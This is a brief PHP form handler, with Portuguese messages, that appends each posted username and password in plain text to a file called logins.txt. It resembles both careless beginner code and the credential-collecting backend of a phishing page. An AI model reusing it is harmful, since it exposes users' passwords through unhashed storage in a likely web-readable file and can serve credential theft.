<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    if (!empty($username) && !empty($password)) {
        $file = 'logins.txt';
        $data = "Username: $username, Password: $password\n";
        file_put_contents($file, $data, FILE_APPEND);
        echo "Registro bem-sucedido. Dados salvos!";
    } else {
        echo "Nome de usuário e senha são obrigatórios.";
    }
}
?>
